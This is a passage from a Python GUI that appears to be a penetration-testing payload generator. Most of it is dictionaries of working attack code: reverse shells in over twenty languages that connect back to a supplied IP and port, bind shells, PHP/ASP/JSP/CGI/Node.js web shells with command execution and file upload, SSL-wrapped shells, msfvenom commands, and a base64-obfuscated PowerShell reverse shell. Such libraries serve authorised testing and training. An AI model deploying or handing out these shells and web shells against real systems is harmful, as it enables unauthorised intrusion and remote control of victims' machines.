            "Netcat OpenBSD": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "Netcat BusyBox": f"rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "Netcat Windows": f"nc.exe {ip} {port} -e cmd.exe",

            # Python shells
            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "Python Windows": f"python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])\"",

            # Perl shells
            "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "Perl Windows": f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",

            # PHP shells
            "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "PHP exec": f"php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
            "PHP passthru": f"php -r '$sock=fsockopen(\"{ip}\",{port});while($cmd=fgets($sock)){{passthru($cmd,$ret);fputs($sock,\"ret:$ret\\n\");}}'",

            # Ruby shells
            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "Ruby Windows": f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",

            # Java shells
            "Java": f"Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");\np.waitFor();",
            "Java Runtime": f"String[] cmd = {{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"}};\nRuntime.getRuntime().exec(cmd);",

            # PowerShell shells
            "PowerShell": f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "PowerShell Base64": self.generate_ps_base64(ip, port),
            "PowerShell SSL": f"$client = New-Object Net.Sockets.TcpClient(\"{ip}\",{port});$ssl = New-Object System.Net.Security.SslStream($client.GetStream(),$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$ssl.AuthenticateAsClient(\"\");$w = New-Object IO.StreamWriter($ssl);$w.AutoFlush=$true;$r = New-Object IO.StreamReader($ssl);while(($cmd = $r.ReadLine()) -ne \"exit\"){{$out = (iex $cmd 2>&1 | Out-String);$w.WriteLine($out)}};$client.Close()",

            # Socat shells
            "Socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
            "Socat TTY": f"socat tcp-connect:{ip}:{port} exec:\"bash -li\",pty,stderr,setsid,sigint,sane",

            # Other shells
            "Awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
            "Lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            "Node.js": f"require('child_process').exec('nc -e /bin/sh {ip} {port}')",
            "Groovy": f"String host=\"{ip}\";\nint port={port};\nString cmd=\"/bin/bash\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}};p.destroy();s.close();",
            "Telnet": f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF",
            "Zsh": f"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
            "Golang": f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
            "C (Linux)": f"// Compile: gcc -o shell shell.c\n#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nint main() {{\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr;\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons({port});\n    addr.sin_addr.s_addr = inet_addr(\"{ip}\");\n    connect(sock, (struct sockaddr *)&addr, sizeof(addr));\n    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);\n    execve(\"/bin/sh\", NULL, NULL);\n    return 0;\n}}",
            "C (Windows)": f"// Compile: x86_64-w64-mingw32-gcc -o shell.exe shell.c -lws2_32\n#include <winsock2.h>\n#include <stdio.h>\n#pragma comment(lib,\"ws2_32\")\n\nWSADATA wsaData;\nSOCKET s;\nstruct sockaddr_in addr;\nSTARTUPINFO si;\nPROCESS_INFORMATION pi;\n\nint main() {{\n    WSAStartup(MAKEWORD(2,2), &wsaData);\n    s = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons({port});\n    addr.sin_addr.s_addr = inet_addr(\"{ip}\");\n    WSAConnect(s,(SOCKADDR*)&addr,sizeof(addr),NULL,NULL,NULL,NULL);\n    memset(&si,0,sizeof(si));\n    si.cb = sizeof(si);\n    si.dwFlags = STARTF_USESTDHANDLES;\n    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;\n    CreateProcess(NULL,\"cmd.exe\",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);\n    return 0;\n}}"
        }
        return shells.get(shell_type, "# Shell type not found")

    def get_bind_shell(self, port, shell_type):
        """Get bind shell payload based on type."""
        shells = {
            "Netcat Bind": f"nc -lvnp {port} -e /bin/bash",
            "Netcat Bind (Windows)": f"nc.exe -lvnp {port} -e cmd.exe",
            "Python Bind": f"python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "Python3 Bind": f"python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "Perl Bind": f"perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack(\"l\",1));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");}};'",
            "PHP Bind": f"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});socket_listen($s,1);$c=socket_accept($s);while(1){{$cmd=socket_read($c,2048);$out=shell_exec($cmd);socket_write($c,$out,strlen($out));}}'",
            "Ruby Bind": f"ruby -rsocket -e 'f=TCPServer.new({port});c=f.accept;c.each_line{{|l|c.puts `#{{l}}`}}'",
            "Socat Bind": f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash",
            "Socat Bind TTY": f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "PowerShell Bind": f"$listener = [System.Net.Sockets.TcpListener]{port};$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()",
            "Node.js Bind": f"require('net').createServer(function(c){{var sh=require('child_process').spawn('/bin/sh',[]);c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}}).listen({port});",
            "Awk Bind": f"awk 'BEGIN{{s=\"/inet/tcp/{port}/0/0\";for(;;){{do{{if((s|&getline c)<=0)break;if(c){{while((c|&getline)>0)print|&s;close(c)}}}}while(c!=\"exit\");close(s)}}}}'"
        }
        return shells.get(shell_type, "# Shell type not found")

    def get_web_shell(self, shell_type):
        """Get web shell payload based on type."""
        shells = {
            # PHP Web Shells
            "PHP Simple": "<?php system($_GET['cmd']); ?>",
            "PHP System": "<?php echo system($_REQUEST['cmd']); ?>",
            "PHP Passthru": "<?php passthru($_GET['cmd']); ?>",
            "PHP Shell_exec": "<?php echo shell_exec($_GET['cmd']); ?>",
            "PHP Backtick": "<?php echo `$_GET['cmd']`; ?>",
            "PHP popen": "<?php $handle = popen($_GET['cmd'], 'r'); echo fread($handle, 2096); pclose($handle); ?>",
            "PHP proc_open": """<?php
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($_GET['cmd'], $descriptorspec, $pipes);
echo stream_get_contents($pipes[1]);
proc_close($process);
?>""",
            "PHP Full Featured": """<?php
// Usage: ?cmd=whoami or POST cmd=whoami
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    echo htmlspecialchars(shell_exec($cmd));
    echo "</pre>";
}
if(isset($_REQUEST['upload'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded";
}
?>
<!-- Upload: <form method="POST" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" name="upload" value="Upload"></form> -->""",
            "PHP Upload": """<?php
if(isset($_FILES['file'])){
    $target = basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){
        echo "Uploaded: $target";
    }
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file"><input type="submit" value="Upload">
</form>""",
            "PHP File Manager": """<?php
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
echo "<h3>$dir</h3><ul>";
foreach(scandir($dir) as $f){
    if($f != '.' && $f != '..'){
        $path = "$dir/$f";
        echo is_dir($path) ? "<li><a href='?dir=$path'>[$f]</a></li>" : "<li>$f</li>";
    }
}
echo "</ul>";
if(isset($_GET['cmd'])) echo "<pre>".shell_exec($_GET['cmd'])."</pre>";
?>""",

            # ASP Web Shells
            "ASP CMD": """<%
Dim cmd
Set cmd = Server.CreateObject("WScript.Shell")
Dim output
output = cmd.Exec("cmd /c " & Request("cmd")).StdOut.ReadAll()
Response.Write("<pre>" & output & "</pre>")
%>""",
            "ASP.NET CMD": """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
if(!string.IsNullOrEmpty(cmd)){
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>""",

            # ASPX Web Shells
            "ASPX CMD": """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
    if(Request["cmd"] != null){
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>""",
            "ASPX Full": """<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e){
    string cmd = Request.QueryString["cmd"];
    if(cmd != null){
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        output.Text = "<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()) + "</pre>";
    }
}
</script>
<html><body>
<form method="GET">Command: <input type="text" name="cmd" size="50"><input type="submit" value="Run"></form>
<asp:Literal id="output" runat="server"/>
</body></html>""",

            # JSP Web Shells
            "JSP CMD": """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.print("<pre>");
    while((line = br.readLine()) != null){ out.println(line); }
    out.print("</pre>");
}
%>""",
            "JSP Runtime": """<%@ page import="java.io.*,java.util.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    String[] cmds = {"/bin/sh", "-c", cmd};
    if(System.getProperty("os.name").toLowerCase().contains("win")){
        cmds = new String[]{"cmd", "/c", cmd};
    }
    Process p = Runtime.getRuntime().exec(cmds);
    Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\\\A");
    out.print("<pre>" + (s.hasNext() ? s.next() : "") + "</pre>");
}
%>
<form method="GET">Cmd: <input name="cmd"><input type="submit"></form>""",
            "JSP ProcessBuilder": """<%@ page import="java.io.*,java.util.*" %>
<%
if(request.getParameter("cmd") != null){
    ProcessBuilder pb;
    if(System.getProperty("os.name").toLowerCase().contains("win")){
        pb = new ProcessBuilder("cmd", "/c", request.getParameter("cmd"));
    } else {
        pb = new ProcessBuilder("/bin/sh", "-c", request.getParameter("cmd"));
    }
    pb.redirectErrorStream(true);
    Process p = pb.start();
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.print("<pre>");
    while((line = br.readLine()) != null) out.println(line);
    out.print("</pre>");
}
%>""",
            "WAR Shell Info": """# To create a WAR shell:
# 1. Create index.jsp with JSP shell code
# 2. Create WEB-INF/web.xml with basic config
# 3. Package: jar -cvf shell.war index.jsp WEB-INF/web.xml
# 4. Deploy to Tomcat manager or copy to webapps/

# web.xml content:
<?xml version="1.0"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
  <welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
  </welcome-file-list>
</web-app>""",

            # CGI Shells
            "CGI Bash": """#!/bin/bash
echo "Content-type: text/html"
echo ""
echo "<html><body><pre>"
$QUERY_STRING
echo "</pre></body></html>"

# Usage: /cgi-bin/shell.cgi?whoami""",
            "CGI Perl": """#!/usr/bin/perl
use CGI qw(:standard);
print header;
print "<pre>";
print `$ENV{'QUERY_STRING'}`;
print "</pre>";

# Usage: /cgi-bin/shell.cgi?whoami""",
            "CGI Python": """#!/usr/bin/env python3
import cgi
import subprocess
import html

print("Content-type: text/html\\n")
params = cgi.FieldStorage()
cmd = params.getvalue('cmd', '')
if cmd:
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(f"<pre>{html.escape(result.stdout + result.stderr)}</pre>")

# Usage: /cgi-bin/shell.py?cmd=whoami""",

            # Node.js Web Shell
            "Node.js Express": """// Save as shell.js and run: node shell.js
const express = require('express');
const { execSync } = require('child_process');
const app = express();

app.get('/cmd', (req, res) => {
    const cmd = req.query.cmd;
    if(cmd){
        try {
            const output = execSync(cmd).toString();
            res.send(`<pre>${output}</pre>`);
        } catch(e) {
            res.send(`<pre>Error: ${e.message}</pre>`);
        }
    } else {
        res.send('Usage: /cmd?cmd=whoami');
    }
});

app.listen(8080, () => console.log('Shell running on port 8080'));
// Usage: http://target:8080/cmd?cmd=whoami"""
        }
        return shells.get(shell_type, "# Shell type not found")

    def get_encrypted_shell(self, ip, port, shell_type):
        """Get encrypted/SSL shell payload based on type."""
        shells = {
            "OpenSSL Reverse": f"""# Attacker (listener):
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port {port}

# Target (connect back):
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s""",

            "OpenSSL Bind": f"""# Target (listener):
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_server -quiet -key key.pem -cert cert.pem -port {port} > /tmp/s

# Attacker (connect):
openssl s_client -quiet -connect <TARGET_IP>:{port}""",

            "Ncat SSL Reverse": f"""# Attacker (listener):
ncat --ssl -lvnp {port}

# Target (connect back):
ncat --ssl {ip} {port} -e /bin/bash""",

            "Ncat SSL Bind": f"""# Target (listener):
ncat --ssl -lvnp {port} -e /bin/bash

# Attacker (connect):
ncat --ssl <TARGET_IP> {port}""",

            "Socat SSL Reverse": f"""# Attacker (listener) - generate cert first:
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:{port},cert=shell.pem,verify=0,fork STDOUT

# Target (connect back):
socat OPENSSL:{ip}:{port},verify=0 EXEC:/bin/bash""",

            "Socat SSL Bind": f"""# Target (listener) - generate cert first:
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:{port},cert=shell.pem,verify=0,fork EXEC:/bin/bash

# Attacker (connect):
socat OPENSSL:<TARGET_IP>:{port},verify=0 STDOUT""",

            "Python SSL Reverse": f"""# Attacker (listener):
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
python3 -c "
import socket,ssl
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('cert.pem', 'key.pem')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind(('0.0.0.0', {port}))
    sock.listen(1)
    with context.wrap_socket(sock, server_side=True) as ssock:
        conn, addr = ssock.accept()
        while True:
            cmd = input('$ ')
            conn.send((cmd + '\\n').encode())
            print(conn.recv(4096).decode(), end='')
"

# Target (connect back):
python3 -c "
import socket,ssl,subprocess,os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
ss = context.wrap_socket(s, server_hostname='{ip}')
ss.connect(('{ip}', {port}))
os.dup2(ss.fileno(),0)
os.dup2(ss.fileno(),1)
os.dup2(ss.fileno(),2)
subprocess.call(['/bin/sh','-i'])
" """,

            "PowerShell SSL Reverse": f"""# Attacker: Set up SSL listener (use ncat --ssl -lvnp {port})

# Target (connect back):
$client = New-Object Net.Sockets.TcpClient("{ip}",{port})
$ssl = New-Object System.Net.Security.SslStream($client.GetStream(),$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]))
$ssl.AuthenticateAsClient("")
$writer = New-Object IO.StreamWriter($ssl)
$writer.AutoFlush = $true
$reader = New-Object IO.StreamReader($ssl)
while(($cmd = $reader.ReadLine()) -ne "exit"){{
    $output = (Invoke-Expression $cmd 2>&1 | Out-String)
    $writer.WriteLine($output)
}}
$client.Close()""",

            "Bash /dev/tcp SSL": f"""# Note: Bash /dev/tcp doesn't support SSL natively
# Use stunnel as a wrapper:

# Attacker - create stunnel.conf:
cat > stunnel.conf << EOF
[shell]
accept = {port}
connect = 127.0.0.1:4445
cert = cert.pem
key = key.pem
EOF

# Start stunnel and nc:
stunnel stunnel.conf
nc -lvnp 4445

# Target - if stunnel available:
stunnel -c -d 127.0.0.1:4446 -r {ip}:{port}
bash -i >& /dev/tcp/127.0.0.1/4446 0>&1"""
        }
        return shells.get(shell_type, "# Shell type not found")

    def get_msfvenom_payload(self, ip, port, shell_type):
        """Get MSFVenom command based on type."""
        payloads = {
            # Linux Payloads
            "Linux x86 Reverse": f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
            "Linux x64 Reverse": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
            "Linux x86 Bind": f"msfvenom -p linux/x86/shell_bind_tcp LPORT={port} -f elf > bind_shell.elf",
            "Linux x64 Bind": f"msfvenom -p linux/x64/shell_bind_tcp LPORT={port} -f elf > bind_shell.elf",
            "Linux x86 Meterpreter": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > meterpreter.elf",
            "Linux x64 Meterpreter": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > meterpreter.elf",

            # Windows Payloads
            "Windows x86 Reverse": f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe",
            "Windows x64 Reverse": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe",
            "Windows x86 Bind": f"msfvenom -p windows/shell_bind_tcp LPORT={port} -f exe > bind_shell.exe",
            "Windows x64 Bind": f"msfvenom -p windows/x64/shell_bind_tcp LPORT={port} -f exe > bind_shell.exe",
            "Windows x86 Meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > meterpreter.exe",
            "Windows x64 Meterpreter": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > meterpreter.exe",
            "Windows x64 Meterpreter HTTPS": f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT={port} -f exe > meterpreter_https.exe",

            # Web Payloads
            "PHP Meterpreter": f"msfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php",
            "Python Meterpreter": f"msfvenom -p python/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.py",
            "Java Meterpreter": f"msfvenom -p java/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jar > shell.jar",
            "ASP Meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp > shell.asp",
            "ASPX Meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx > shell.aspx",
            "JSP Meterpreter": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp",
            "WAR Meterpreter": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war",

            # Other Platforms
            "macOS x64 Reverse": f"msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho > shell.macho",
            "macOS x64 Bind": f"msfvenom -p osx/x64/shell_bind_tcp LPORT={port} -f macho > bind_shell.macho",
            "Android Meterpreter": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > shell.apk",
            "NodeJS Reverse": f"msfvenom -p nodejs/shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.js"
        }

        # Add handler command as a comment
        payload_cmd = payloads.get(shell_type, "# Payload type not found")

        # Add listener setup info
        handler_info = f"""
# Start Metasploit handler:
# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD <payload_name>; set LHOST {ip}; set LPORT {port}; run"
"""
        return payload_cmd + handler_info

    def generate_ps_base64(self, ip, port):
        """Generate Base64 encoded PowerShell reverse shell."""
        ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        encoded = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        return f"powershell -e {encoded}"

    def copy_to_clipboard(self, text):
        """Copy text to clipboard."""
        self.root.clipboard_clear()
        self.root.clipboard_append(text.strip())
        self.update_status("Copied to clipboard")

    def create_encoders_tab(self):
        """Create the Encoders tab for encoding data."""
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Header
        header = tk.Label(
            frame,
            text="🔐 ENCODERS",
            font=("Courier", 14, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_secondary
        )
        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)

        # Encoding type
        label = tk.Label(frame, text="Encoding Type:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        self.encoder_type = ttk.Combobox(frame, values=[
            "Base64",
            "URL Encode",
            "HTML Entities",
            "Hex",
            "Binary",
            "ROT13",
            "Unicode",
            "ASCII to Decimal",
            "MD5 Hash",
            "SHA1 Hash",
            "SHA256 Hash"
        ], font=("Courier", 10), state="readonly", width=25)
        self.encoder_type.grid(row=1, column=1, sticky=tk.W, padx=10, pady=5)
        self.encoder_type.current(0)

        # Input
        input_label = tk.Label(frame, text="Input Text:", font=("Courier", 10, "bold"),
                              fg=self.accent_cyan, bg=self.bg_secondary)
        input_label.grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))

        self.encoder_input = scrolledtext.ScrolledText(
            frame, height=5, font=("Consolas", 11),
            bg="#1E1E1E", fg=self.text_color,
            insertbackground=self.accent_green,
            selectbackground=self.accent_yellow,
            wrap=tk.WORD, relief=tk.FLAT
        )
        self.encoder_input.grid(row=3, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)

        # Encode button
        encode_btn = tk.Button(
            frame,
            text="⚡ ENCODE",
            font=("Courier", 11, "bold"),
            bg=self.accent_green,
            fg=self.bg_primary,
            activebackground=self.accent_cyan,
            relief=tk.FLAT,
            padx=20,
            pady=10,
            cursor="hand2",
            command=self.encode_text
        )
        encode_btn.grid(row=4, column=0, columnspan=2, padx=10, pady=15)

        # Output
        output_label = tk.Label(frame, text="Encoded Output:", font=("Courier", 10, "bold"),
                               fg=self.accent_cyan, bg=self.bg_secondary)
        output_label.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))

        self.encoder_output = scrolledtext.ScrolledText(
            frame, height=5, font=("Consolas", 11),
            bg="#1E1E1E", fg=self.accent_green,
            insertbackground=self.accent_green,
            selectbackground=self.accent_yellow,
            wrap=tk.WORD, relief=tk.FLAT
        )
        self.encoder_output.grid(row=6, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)

        # Copy button
        copy_btn = tk.Button(
            frame,
            text="📋 COPY TO CLIPBOARD",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
